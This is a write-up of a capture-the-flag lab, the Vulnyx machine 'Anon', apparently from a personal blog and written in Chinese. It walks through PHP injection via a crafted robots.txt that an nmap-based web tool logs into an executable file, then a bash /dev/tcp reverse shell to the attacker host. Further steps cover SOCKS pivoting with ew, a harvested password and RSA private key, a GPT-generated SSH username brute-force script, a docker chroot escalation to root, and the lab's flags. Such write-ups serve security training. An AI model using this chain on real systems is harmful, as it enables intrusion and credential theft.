---
title: Vulnyx-Anon
published: 2025-03-09 16:18:04
tags: [Vulnyx]
category: 靶机
draft: false
---

# Anon

> Difficulty: **Medium**
> 

## 信息收集

```python
┌──(root㉿kali)-[~/Desktop/test/Hero]
└─# nmap -sP 192.168.56.0/24                  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 09:16 EST
Nmap scan report for 192.168.56.1
Host is up (0.00046s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00049s latency).
MAC Address: 08:00:27:1B:2E:A6 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.19
Host is up (0.00027s latency).
MAC Address: 08:00:27:BA:F4:75 (Oracle VirtualBox virtual NIC)
```

```python
┌──(root㉿kali)-[~/Desktop/test/Hero]
└─# nmap -sT -min-rate 10000 -p- 192.168.56.19
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 09:17 EST
Nmap scan report for 192.168.56.19
Host is up (0.00060s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:BA:F4:75 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.61 seconds
```

```python
┌──(root㉿kali)-[~/Desktop/test/Hero]
└─# nmap -sT -A -T4 -p 22,80 192.168.56.19     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 09:18 EST
Nmap scan report for 192.168.56.19
Host is up (0.00062s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:BA:F4:75 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.62 ms 192.168.56.19
```

```python
┌──(root㉿kali)-[~]
└─# nmap -script=vuln -p 22,80 192.168.56.19
Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org/) ) at 2025-02-08 00:33 EST
Stats: 0:00:16 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 50.00% done; ETC: 00:34 (0:00:16 remaining)
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.56.19
Host is up (0.00066s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 08:00:27:BA:F4:75 (Oracle VirtualBox virtual NIC)
```

优先级 `80` > `22`

## 80 端口

访问主页，是默认页面

![image.png](image.png)

没什么信息，扫描一下目录，扫描到`/Anonymous-Connections` 目录

```python
┌──(root㉿kali)-[~]
└─# gobuster dir -u http://192.168.56.19 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.19
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
/Anonymous-Connections (Status: 301) [Size: 330] [--> http://192.168.56.19/Anonymous-Connections/]
Progress: 661680 / 661683 (100.00%)
===============================================================
Finished
===============================================================
```

访问，提示 输入目标`IP` 

![image.png](image%201.png)

经过测试，这里接入的是`nmap`的命令

![image.png](image%202.png)

尝试一下命令拼接 `127.0.0.1 | ls` ，会提示`Invalid IP.`

![image.png](image%203.png)

尝试绕过但是没成功，基于扫描到的目录再去扫描一遍，扫描到新目录`victims`

```python
┌──(root㉿kali)-[~/Desktop/test/Anon]
└─# gobuster dir -u http://192.168.56.19/Anonymous-Connections/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.19/Anonymous-Connections/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 2426]
/victims              (Status: 301) [Size: 338] [--> http://192.168.56.19/Anonymous-Connections/victims/]
/.php                 (Status: 403) [Size: 278]
Progress: 661680 / 661683 (100.00%)
===============================================================
Finished
===============================================================
```

是存放扫描日志的目录

![image.png](image%204.png)

但是`nmap`会扫描`robots.txt`文件，我们在文件夹开启服务器后并编写一个`robots.txt`文件

```python
# robots.txt
User-agent: *
Disallow: index.php
```

再扫描一下我们的`IP` ，可以看到它去访问了我们不存在`index.php`，并会将 `robots.txt` 的内容作为输出出现，然后会将内容写到日志里边去

![image.png](image%205.png)

我们将`Disallow` 改成可执行的代码，然后输入我们的`IP`然后`scan`

```python
User-agent: *
Disallow: <?php phpinfo() ?>
```

然后访问日志目录，可以看到`phpinfo()`成功执行了（大概是服务器让`log`后缀能执行`php`代码）

![image.png](image%206.png)

## 反弹shell

1. `kali`开启监听
    
    ```python
    ┌──(root㉿kali)-[~]
    └─# nc -lvp 4444 -e /bin/sh                 
    listening on [any] 4444 ...
    ```
    
2. 在`robots.txt`文件里面写入反弹`shell`代码
    
    ```python
    User-agent: *
    Disallow: <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.4/4444 0>&1'");?>
    ```
    
3. 点击`scan`后，去访问输出的日志，`kali`即可获得`shell`
    
    ```python
    ┌──(root㉿kali)-[~]
    └─# nc -lvp 4444           
    listening on [any] 4444 ...
    192.168.56.19: inverse host lookup failed: Host name lookup failure
    connect to [192.168.56.4] from (UNKNOWN) [192.168.56.19] 58606
    hacktivist@debian1:/var/www/html/Anonymous-Connections/victims$ 
    ```
    

## 靶机信息收集 - 1

```python
hacktivist@debian1:/var/www/html/Anonymous-Connections/victims$ id
uid=1000(hacktivist) gid=1000(hacktivist) groups=1000(hacktivist),27(sudo)

hacktivist@debian1:/var/www/html/Anonymous-Connections/victims$ ip add
ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
9: eth1@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:0a:0a:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.10.10.10/24 brd 10.10.10.255 scope global eth1
       valid_lft forever preferred_lft forever

hacktivist@debian1:/var/www/html/Anonymous-Connections/victims$ uname -a
Linux debian1 6.1.0-30-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.124-1 (2025-01-12) x86_64 GNU/Linux

```

在`history`中得到密码

```python
# history 
echo 'root:$uP3r_$3cUr3_D0ck3r' | chpasswd
cd
nano .bash_history 
```

环境是在`Docker`容器里

```python
hacktivist@debian1:/home/hacktivist$ ls -al /
ls -al /
total 76
drwxr-xr-x   1 root root 4096 Feb  4 10:48 .
drwxr-xr-x   1 root root 4096 Feb  4 10:48 ..
-rwxr-xr-x   1 root root    0 Feb  4 10:48 .dockerenv
lrwxrwxrwx   1 root root    7 Feb  3 00:00 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Dec 31 10:25 boot
drwxr-xr-x   5 root root  360 Feb  7 14:13 dev
drwxr-xr-x   1 root root 4096 Feb  4 21:02 etc
drwxr-xr-x   1 root root 4096 Feb  4 15:07 home
lrwxrwxrwx   1 root root    7 Feb  3 00:00 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Feb  3 00:00 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 Feb  3 00:00 media
drwxr-xr-x   2 root root 4096 Feb  3 00:00 mnt
drwxr-xr-x   2 root root 4096 Feb  3 00:00 opt
dr-xr-xr-x 146 root root    0 Feb  7 14:13 proc
drwx------   1 root root 4096 Feb  4 23:15 root
drwxr-xr-x   1 root root 4096 Feb  4 20:42 run
lrwxrwxrwx   1 root root    8 Feb  3 00:00 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Feb  3 00:00 srv
dr-xr-xr-x  13 root root    0 Feb  7 14:13 sys
drwxrwxrwt   1 root root 4096 Feb  7 14:13 tmp
drwxr-xr-x   1 root root 4096 Feb  3 00:00 usr
drwxr-xr-x   1 root root 4096 Feb  4 10:48 var
```

看到存在`.sudo_as_admin_successful` ，表示当用户首次成功使用 `sudo` 命令时，系统会在其家目录下创建此文件，那么该用户可能可以使用`sudo`来执行命令

```python
hacktivist@debian1:/home/hacktivist$ ls -al
total 24
drwxr-xr-x 2 hacktivist hacktivist 4096 Feb  4 23:14 .
drwxr-xr-x 1 root       root       4096 Feb  4 15:07 ..
-rw------- 1 hacktivist hacktivist   86 Feb  7 18:15 .bash_history
-rw-r--r-- 1 hacktivist hacktivist  220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 hacktivist hacktivist 3526 Mar 29  2024 .bashrc
-rw-r--r-- 1 hacktivist hacktivist  807 Mar 29  2024 .profile
-rw-r--r-- 1 hacktivist hacktivist    0 Feb  4 20:52 .sudo_as_admin_successful
```

查看其权限，可以使用`sudo`执行任何命令

```python
hacktivist@debian1:/home/hacktivist$ sudo -l
sudo -l
Matching Defaults entries for hacktivist on debian1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User hacktivist may run the following commands on debian1:
    (ALL : ALL) NOPASSWD: ALL
```

因为在外边可以使用`nmap` ，那么容器里应该也是可以的，我们可以使用它来扫描可用端口

我们当前知道有`172.17.0.2` 和`10.10.10.10` ，其中`10.10.10.10`前边可能还存在有别的容器

通过`nmap`来扫描主机，还存在另外一台机器`10.10.10.20`

```python
hacktivist@debian1:/var/www/html/Anonymous-Connections/victims$ sudo nmap -sP 10.10.10.0/24
.10.10.0/24sP 10.
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-07 18:44 UTC
Nmap scan report for 10.10.10.1
Host is up (0.000026s latency).
MAC Address: 02:42:0B:4E:D9:36 (Unknown)
Nmap scan report for debian2.private (10.10.10.20)
Host is up (0.000025s latency).
MAC Address: 02:42:0A:0A:0A:14 (Unknown)
Nmap scan report for debian1 (10.10.10.10)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 14.85 seconds
```

扫描一下`10.10.10.20`机器的端口，发现`2222`端口

```python
hacktivist@debian1:/var/www/html/Anonymous-Connections/victims$ sudo nmap -min-rate 10000 10.10.10.20
ate 10000 10.10.10.20
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-07 18:50 UTC
Nmap scan report for debian2.private (10.10.10.20)
Host is up (0.0000060s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1
MAC Address: 02:42:0A:0A:0A:14 (Unknown)
```

在扫描一下服务信息，发现是`SSH`服务，上边的密码可能就是这里的

```python
hacktivist@debian1:/var/www/html/Anonymous-Connections/victims$ sudo nmap -sT -A -T4 -O 10.10.10.20
 -T4 -O 10.10.10.20
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-07 18:52 UTC
Nmap scan report for debian2.private (10.10.10.20)
Host is up (0.00010s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 39b4417103f9114efe67d53ab63e4ceb (ECDSA)
|_  256 e133f35557dd7df76fdfdeea5cb7263d (ED25519)
MAC Address: 02:42:0A:0A:0A:14 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.10 ms debian2.private (10.10.10.20)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.72 seconds
```

## 转发端口

1. 将`ew`上传到靶机,并设置权限
    
    ```python
    wget 192.168.56.4/ew_for_linux64
    
    chmod +x ew_for_linux64
    ```
    
2. 设置反向代理
    
    `Kali`监听`1080`端口，收到的请求转发给反向链接过来到`8889`端口的主机
    
    ```python
    ./ew_for_linux64 -s rcsocks -l 1080 -e 8889
    ```
    
    靶机反向链接`Kali`的`8889`端口
    
    ```python
    ./ew_for_linux64 -s rssocks -d 192.168.56.4 -e 8889
    ```
    
3. `kali`设置代理，修改`/etc/proxycharin4.conf`
    
    ```python
    [ProxyList]
    # add proxy here ...
    # meanwile
    # defaults set to "tor"
    socks4  127.0.0.1     1080
    ```
    
4. `kali`通过`proxychain4`来连接靶机内网，使用上边得到的密码成功进入，但是很容易断开（泪）
    
    ```python
    ┌──(root㉿kali)-[~/Desktop/Tools]
    └─# proxychains4 ssh root@10.10.10.20 -p 2222
    [proxychains] config file found: /etc/proxychains4.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.10.20:2222 <--   0 --> (open)used/unused  1/999
     ...  OK
    root@10.10.10.20's password: 
    Linux debian2 6.1.0-30-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.124-1 (2025-01-12) x86_64
    
    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Tue Feb  4 23:12:09 2025 from 10.10.10.1
    root@debian2:~# 
    ```
    

## 靶机信息收集 - 2

在当前目录可以找到`.ssh`文件夹，里边有`id_rsa`

```python
root@debian2:~# ls -al                                                        
total 28                                                                      
drwx------ 4 root root 4096 Feb  4 22:01 .                      
drwxr-xr-x 1 root root 4096 Feb  4 11:17 ..                     
-rw------- 1 root root   93 Feb  4 23:12 .bash_history          
-rw-r--r-- 1 root root  586 Feb  4 20:29 .bashrc                
drwxr-xr-x 3 root root 4096 Feb  4 20:21 .local                 
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile               
drwx------ 2 root root 4096 Feb  4 21:38 .ssh 

root@debian2:~/.ssh# ls
authorized_keys  id_rsa

root@debian2:~/.ssh# cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCRrZRaJ9mGQEKzOURbCFrL3WIKdEpcCU+RhEKshjHYrwSVa/sLPqTPMtCFN2AIAOk5kYmWxWcd4FRXZvkuh5+hJKtyOCkzyD/nlX7JRH9U4TjpmNbJjAwKi68/iOYBBrjR+Y8JYG8poyHQNAcFvnKuFLiuYRl2fu/qfIFoCtCAJcWVgz00yKsa0fpwqEqr1+CnbIQN/K+W6rYM1kdwzCE8H2YUQ4SNCwngOVGh3RZ4UlJVlLJMJ7/awNHFgYQew/Iwliziu4AcidQkhgELCw+t52wSY2vEQ2OKumnw+NMikL6RcESAsYhyPO6fNPYzcvscwKMacngBXyfPKSOSYP2N
```

我们将`id_rsa`保存到`kali` ，可能是某个正确的用户的密钥，但是我们不知道用户名

```python
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAka2UWifZhkBCszlEWwhay91iCnRKXAlPkYRCrIYx2K8ElWv7
Cz6kzzLQhTdgCADpOZGJlsVnHeBUV2b5LoefoSSrcjgpM8g/55V+yUR/VOE46ZjW
yYwMCouvP4jmAQa40fmPCWBvKaMh0DQHBb5yrhS4rmEZdn7v6nyBaArQgCXFlYM9
NMirGtH6cKhKq9fgp2yEDfyvluq2DNZHcMwhPB9mFEOEjQsJ4DlRod0WeFJSVZSy
TCe/2sDRxYGEHsPyMJYs4ruAHInUJIYBCwsPredsEmNrxENjirpp8PjTIpC+kXBE
gLGIcjzunzT2M3L7HMCjGnJ4AV8nzykjkmD9jQIDAQABAoIBAHON3Zx5+ajtNjtW
FKuk/+iwLcGfJxDEbfI+mGijdcysX5Vq9tKfmTml1BOnriwLFPUORbZr1XS0ahJ+
YvAOsoevP7O1arFhiZdYVR6vj9UzZeKd0tpClZaT4KokHFX6EAa2z0gfz22Wsg6m
Bl//BpahZzEjYoBFBmfY5QkzctoCZQRhkTAhR520+oCFiosHGyiH6QCGYsO6WmwQ
7w7cm7rQ/MLNkgenRFUm0PRXrqti2K3kFUnU/Pfb9k4DoUtKSjpvA3kNbH9pIxlN
skbCJJfJeQpalBKwQyGqNkCzH9qMm31ZuLHsp6L73po2rWFIcoeraLhA/5No+S21
+v01t30CgYEA5mtTtslQmR2xhVr69z1lDdaFFaGsUWH5vlIGBvphAQsl2OwUbWk/
7rLy4yhddEYTfyc5xorkRsjmNjNyhMrtYks1ycvtEvCee7NuGHSO0Grzp3MKbAAY
t/gmGMckr9zdcsVVCIshm8PYo4feXClrHMe0MWLv97kcgGWvGLH+4UcCgYEAodnZ
dPL9J/O83kO5zybWlUL4RoIGLdP2axqNxoDju87qKNTKdsrKnmNV5NlQ+VH05eZ/
gQ5ninqFAR0hsvf4AHYmjySwY6S6mGnrXlhYkUE37crHVxdQruvtgUk4cTB0Lbk9
Vg0LoAnCJr96nJSWVcpER/p7/KD1LIcU/4oT9IsCgYEAlCT9NdBJWaiVsj/Ei6GV
j0gVWMsRl2F+yLbD2UixhZI9SzK+D3pT+IxlTVdufotvjZkStGwoSLpyCPca8fXm
mgPxGUVbr4m026OJbX/DMo0RCuAUG0wUmHObSuL+23MNjfUBrvSFLzjD2KBKfsbC
b0aWvAn4bzU89fBqm14VmZECgYEAn1T7+2J+j8cl5lUb5W9hjb1I9vhnptPk4VlZ
utIF30x6PkoFKt7GixhVZZ3+VgM1qOG6Ic2RZsTojMkl9K6iSaoGmaJPtzhirUqQ
d+dXAWAH9CNNDFKajikaPc1cMCm4JY8Xb9AV4q3YoRadWOn5+WjOwWE4j+HQms48
gLhonrMCgYEAthB9GOhxzeX5VEaw91tWhAdD+WNEO9TMN9fsyE9cISddgmBA5ozh
aTJl/gt09UodQhCNTmjYGByTkzGPH5c01HVhWfompn3GmK3jKwTbrUYh+P13Q1vn
A6j+O3UaX0P8w4seXeGyU2DA9iWCkwiKUUb4nj5IWt50Khmjv7BaXog=
-----END RSA PRIVATE KEY-----
```

## 爆破用户名

使用`GPT`生成脚本（好用）

```python
#!/bin/bash

# 目标服务器信息
TARGET_IP="192.168.56.19"
PRIVATE_KEY="id"
USERNAME_FILE="./../Dict/SecLists-2024.3/Usernames/xato-net-10-million-usernames.txt"

# 检查私钥文件是否存在
if [ ! -f "$PRIVATE_KEY" ]; then
  echo "密钥文件 $PRIVATE_KEY 不存在，请检查路径。"
  exit 1
fi

# 检查用户名字典文件是否存在
if [ ! -f "$USERNAME_FILE" ]; then
  echo "用户名字典文件 $USERNAME_FILE 不存在，请检查路径。"
  exit 1
fi

# 读取用户名字典
USERNAMES=( $(cat "$USERNAME_FILE") )

# 爆破用户名循环
for USERNAME in "${USERNAMES[@]}"; do
  echo "尝试登录: $USERNAME"

  # 执行 SSH 登录，2秒超时避免卡住
  OUTPUT=$(ssh -o BatchMode=yes -o ConnectTimeout=2 "$USERNAME"@$TARGET_IP -i "$PRIVATE_KEY" exit 2>&1)

  # 检查是否输出包含 "password"（通常代表需要密码）
  if echo "$OUTPUT" | grep -qi "password"; then
    echo "[失败] $USERNAME 需要密码，跳过。"
  else
    echo "[成功] 找到有效用户名: $USERNAME"
  fi

  echo "-------------------------------"
done
```

最后爆破出来用户名`alfredo`

```python
┌──(root㉿kali)-[~/Desktop/test/Anon]
└─# ssh alfredo@192.168.56.19 -i id
alfredo@anon:~$ 
```

## UserFlag

```python
alfredo@anon:~$ cat user.txt 
af13f20ce2fb4266b4d381cf8f60f85f
```

## 提权

查看权限，拥有`Docker`权限

```python
alfredo@anon:/home$ id
uid=1000(alfredo) gid=1000(alfredo) grupos=1000(alfredo),109(docker)
```

```python
alfredo@anon:/home$ docker ps
CONTAINER ID   IMAGE           COMMAND       CREATED      STATUS       PORTS                               NAMES
e0bc4c70b0df   debian:latest   "/bin/bash"   3 days ago   Up 6 hours                                       debian2
b2d474841fe1   debian:latest   "/bin/bash"   3 days ago   Up 6 hours   0.0.0.0:80->80/tcp, :::80->80/tcp   debian1
```

```python
alfredo@anon:/home$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED      SIZE
debian2      latest    8862ed54f766   3 days ago   117MB
debian1      latest    62c15a42ee05   3 days ago   117MB
debian       latest    18f9bd665a29   4 days ago   117MB
```

可以直接提权了

```python
alfredo@anon:/home$ docker run -v /:/mnt --rm -it debian chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

## RootFlag

```python
# cat /root/root.txt
f3a421bdd1e5119f49c3fda29838cf79
```

## 总结

更熟悉了`Docker`容器环境下如何操作，更熟悉`ew`的使用，`Shell`脚本的利用，夸大思维